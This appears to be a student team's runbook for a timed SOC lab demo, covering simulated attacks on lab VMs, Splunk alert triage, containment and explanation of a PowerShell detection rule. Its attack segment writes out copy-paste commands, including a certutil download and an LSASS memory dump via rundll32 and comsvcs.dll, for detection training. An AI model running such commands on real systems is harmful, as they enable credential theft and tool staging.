# Step 1.6: 8-Minute Live Demo Runbook (Attack, Alert, Response & Explain One Rule)

Per **Step 1.6** (*"8-minute live demo: attack, alert, response, explain one rule"*), this runbook structures our live 8-minute team demonstration and individual viva handoffs with strict timeboxing.

---

## 1. 8-Minute Live Demo Schedule & Speaker Rotation

| Time Window | Duration | Demo Segment | Presenter | Live Screen / Terminal Shown | Key Verification Output |
| :---: | :---: | :--- | :--- | :--- | :--- |
| **`00:00 – 02:00`** | **2 min** | **1. Live Attack Execution** | **Member 1** *(Red Team)* | Windows VM `DESKTOP-DTUQ6D4` (`192.168.120.150`) PowerShell & Linux VM `web` (`192.168.120.151`) SSH | Executes encoded PowerShell (`T1059.001`), Certutil staging (`T1105`), Scheduled Task (`T1053.005`), and LSASS MiniDump (`T1003.001`). |
| **`02:00 – 04:00`** | **2 min** | **2. SIEM Alert Firing & Triage** | **Member 2** *(SIEM Lead)* | Splunk Enterprise (`192.168.120.149:8000`) — `Triggered Alerts` & 5-Panel SOC Dashboard | Shows real-time alerts firing (`< 1s` delay), correlates timeline on `DESKTOP-DTUQ6D4`, assigns **P1 Critical**, and demonstrates the **6-Field Escalation Call**. |
| **`04:00 – 06:00`** | **2 min** | **3. Live Containment, Eradication & Evidence Hashing** | **Member 3** *(IR & Forensics)* | `DESKTOP-DTUQ6D4` Admin PowerShell + Splunk Recovery Search | Follows **Playbook PB-01**: blocks outbound C2 (`SOC_Contain_Outbound_C2`), computes SHA-256 hashes (`Get-FileHash`), deletes `SOC_Test_Task` & `test.txt`, and shows `0 events` in Splunk. |
| **`06:00 – 08:00`** | **2 min** | **4. Deep-Dive Explanation of One Rule (Sigma $ightarrow$ SPL $ightarrow$ Tuning)** | **Member 4** *(Readiness Lead)* | Split screen: `rule01_T1059_001_powershell.yml` + `rule05_T1110_brute_force_correlation.yml` in Splunk | Explains behavioral detection vs. static hashes, walks through Before/After tuning (`NOT Account_Name="SYSTEM"` dropping 681 FPs to 0), and links to Part 2 Risk Register. |

---

## 2. Exact Commands to Copy-Paste During Live Demo

### Segment 1 (`00:00 – 02:00`): Live Attack Commands on `DESKTOP-DTUQ6D4`
```powershell
# 1. T1059.001 — Encoded PowerShell Execution (Rule 01)
powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAVABlAHMAdAAnAA==

# 2. T1105 — Ingress Tool Transfer via Certutil (Rule 08)
certutil.exe -urlcache -f http://192.168.120.151/test.txt C:\Windows\Temp\test.txt

# 3. T1053.005 — Persistence via Scheduled Task (Rule 02)
schtasks /create /tn "SOC_Test_Task" /tr "notepad.exe" /sc once /st 23:59 /f

# 4. T1003.001 & T1218.011 — LSASS Credential Dump via Rundll32 & Comsvcs.dll (Rule 04 & Rule 07)
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full
```

### Segment 2 (`02:00 – 04:00`): Live Splunk Alert & Triage Query on `splunk-siem` (`192.168.120.149:8000`)
```spl
index=* sourcetype="WinEventLog:*" host="DESKTOP-DTUQ6D4" (EventCode=4688 OR EventCode=4104 OR EventCode=4698 OR EventCode=7045) NOT Account_Name="SYSTEM"
| eval latency_sec = _indextime - _time
| table _time, latency_sec, EventCode, Account_Name, Creator_Process_Name, New_Process_Name, Process_Command_Line
| sort - _time
```

### Segment 3 (`04:00 – 06:00`): Live Containment, Evidence Hashing & Eradication on `DESKTOP-DTUQ6D4`
```powershell
# Step A: Forensic SHA-256 Hashing BEFORE Eradication
Get-FileHash -Algorithm SHA256 C:\Windows\Temp\test.txt, C:\Windows\Temp\lsass.dmp

# Step B: Host Network Containment (Block Outbound C2)
New-NetFirewallRule -DisplayName "SOC_Contain_Outbound_C2" -Direction Outbound -Action Block -RemoteAddress 198.51.100.0/24
Get-NetFirewallRule -DisplayName "SOC_Contain_Outbound_C2" | Select-Object DisplayName, Enabled, Direction, Action

# Step C: Persistence & Payload Eradication
schtasks /delete /tn "SOC_Test_Task" /f
Remove-Item -Path C:\Windows\Temp\test.txt, C:\Windows\Temp\lsass.dmp -Force -ErrorAction SilentlyContinue
```

### Segment 4 (`06:00 – 08:00`): Rule Deep-Dive Talking Points (Viva Ready)
1. **Why Behavioral Detection Wins:** If an attacker renames `test.txt` or recompiles a payload with a new SHA-256 hash, hash-based rules fail immediately. By matching **command-line flags (`-EncodedCommand`, `comsvcs.dll MiniDump`, `/create`) and temporal event correlation (`>=3 EventCode 4625` followed by `4624` in 10m)**, the rule detects the *technique* regardless of binary name or hash.
2. **Why Tuning Matters:** Our initial Rule 01 fired 681 times on `C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe` running as `SYSTEM`. Adding `NOT Account_Name="SYSTEM" NOT New_Process_Name="*splunk-powershell.exe*"` eliminated 100% of false-positive noise while preserving 100% true-positive detection on interactive user/admin attacks.
